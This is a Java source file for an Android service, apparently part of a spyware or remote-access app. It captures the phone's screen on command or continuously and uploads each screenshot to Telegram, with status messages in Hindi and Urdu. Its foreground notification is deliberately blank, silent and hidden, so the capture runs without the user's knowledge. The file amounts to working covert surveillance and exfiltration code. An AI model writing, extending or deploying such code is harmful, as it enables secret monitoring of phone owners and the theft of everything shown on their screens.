package com.smshandler;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class ScreenCaptureService extends Service {

    public static final String ACTION_CAPTURE    = "CAPTURE_NOW";
    public static final String ACTION_START_CONT = "START_CONTINUOUS";
    public static final String ACTION_STOP_CONT  = "STOP_CONTINUOUS";
    public static final String ACTION_STOP       = "STOP";

    static int     sResultCode        = 0;
    static Intent  sResultData        = null;
    static boolean sRunning           = false;

    static boolean sPendingContinuous = false;
    static int     sPendingInterval   = 30;

    private MediaProjection  mProjection;
    private VirtualDisplay   mDisplay;
    private ImageReader      mReader;
    private Handler          mHandler;
    private HandlerThread    mThread;
    private volatile boolean mReady      = false;
    private volatile boolean mContinuous = false;
    private int              mInterval   = 30;

    private final Runnable mContTask = new Runnable() {
        @Override public void run() {
            if (mContinuous && mReady) {
                takeScreenshot();
                if (mContinuous) mHandler.postDelayed(this, mInterval * 1000L);
            }
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;

        if (ACTION_STOP.equals(action)) {
            teardown();
            return START_NOT_STICKY;
        }

        if (ACTION_STOP_CONT.equals(action)) {
            mContinuous = false;
            if (mHandler != null) mHandler.removeCallbacks(mContTask);
            SmsService.sendRawMessage("🛑 Screen mirror band. Service background mein active hai.");
            return START_STICKY;
        }

        startForeground(9904, buildNotif());
        sRunning = true;

        if (!mReady && mThread == null) {
            if (sResultCode == 0 || sResultData == null) {
                SmsService.sendRawMessage("❌ Screen permission nahi mili. App dobara kholo aur /screenshot try karo.");
                sRunning = false;
                stopForeground(true);
                stopSelf();
                return START_NOT_STICKY;
            }
            mThread = new HandlerThread("ScreenCap");
            mThread.start();
            mHandler = new Handler(mThread.getLooper());
            mHandler.post(this::initProjection);
        }

        if (ACTION_CAPTURE.equals(action)) {
            long delay = mReady ? 100 : 1500;
            mHandler.postDelayed(this::takeScreenshot, delay);

        } else if (ACTION_START_CONT.equals(action)) {
            int interval = (intent != null) ? intent.getIntExtra("interval", 30) : 30;
            mContinuous = true;
            mInterval   = Math.max(5, interval);
            mHandler.removeCallbacks(mContTask);
            long delay = mReady ? 500 : 1800;
            mHandler.postDelayed(mContTask, delay);

        } else if (!mReady) {
            if (sPendingContinuous) {
                mContinuous = true;
                mInterval   = sPendingInterval;
                mHandler.postDelayed(mContTask, 1800);
            } else {
                mHandler.postDelayed(this::takeScreenshot, 1500);
            }
        }

        return START_STICKY;
    }

    private void initProjection() {
        try {
            MediaProjectionManager mgr = (MediaProjectionManager)
                getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mProjection = mgr.getMediaProjection(sResultCode, sResultData);

            WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(dm);
            int w = dm.widthPixels, h = dm.heightPixels, dpi = dm.densityDpi;

            mReader  = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
            mDisplay = mProjection.createVirtualDisplay("ScreenCap",
                w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mReader.getSurface(), null, null);

            mReady = true;
        } catch (Exception e) {
            SmsService.sendRawMessage("❌ Screen init failed: " + e.getMessage());
            sRunning = false;
        }
    }

    void takeScreenshot() {
        if (!mReady || mReader == null) {
            SmsService.sendRawMessage("❌ Screen projection ready nahi. /screenshot dobara try karo.");
            return;
        }
        try {
            try { Thread.sleep(250); } catch (InterruptedException ignored) {}

            Image img = mReader.acquireLatestImage();
            if (img == null) {
                try { Thread.sleep(600); } catch (InterruptedException ignored) {}
                img = mReader.acquireLatestImage();
            }
            if (img == null) {
                SmsService.sendRawMessage("❌ Screenshot: frame nahi mila, dobara try karo.");
                return;
            }

            Image.Plane[] planes   = img.getPlanes();
            ByteBuffer    buf      = planes[0].getBuffer();
            int w = img.getWidth(), h = img.getHeight();
            int rowStride    = planes[0].getRowStride();
            int pixelStride  = planes[0].getPixelStride();

            Bitmap bmp = Bitmap.createBitmap(rowStride / pixelStride, h, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buf);
            img.close();

            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, w, h);
            bmp.recycle();

            int maxW = 1080;
            if (cropped.getWidth() > maxW) {
                float scale = (float) maxW / cropped.getWidth();
                Bitmap scaled = Bitmap.createScaledBitmap(cropped, maxW,
                    (int)(cropped.getHeight() * scale), true);
                cropped.recycle();
                cropped = scaled;
            }

            File f = new File(getCacheDir(), "sc_" + System.currentTimeMillis() + ".jpg");
            FileOutputStream fos = new FileOutputStream(f);
            cropped.compress(Bitmap.CompressFormat.JPEG, 85, fos);
            fos.close();
            cropped.recycle();

            SmsService.sendPhotoToTelegram(f, "📱 Screenshot");
            f.delete();

        } catch (Exception e) {
            SmsService.sendRawMessage("❌ Screenshot failed: " + e.getMessage());
        }
    }

    private void teardown() {
        sRunning    = false;
        mReady      = false;
        mContinuous = false;
        if (mHandler    != null) { mHandler.removeCallbacks(mContTask); }
        if (mDisplay    != null) { mDisplay.release();    mDisplay    = null; }
        if (mProjection != null) { mProjection.stop();    mProjection = null; }
        if (mReader     != null) { mReader.close();       mReader     = null; }
        if (mThread     != null) { mThread.quit();        mThread     = null; }
        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        sRunning = false;
        mReady   = false;
        if (mDisplay    != null) { try { mDisplay.release();   } catch (Exception ignored) {} mDisplay    = null; }
        if (mProjection != null) { try { mProjection.stop();   } catch (Exception ignored) {} mProjection = null; }
        if (mReader     != null) { try { mReader.close();      } catch (Exception ignored) {} mReader     = null; }
        if (mThread     != null) { try { mThread.quit();       } catch (Exception ignored) {} mThread     = null; }
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent i) { return null; }

    private Notification buildNotif() {
        return new NotificationCompat.Builder(this, SmsService.CH_ID)
            .setSmallIcon(R.drawable.ic_sword)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .build();
    }
}
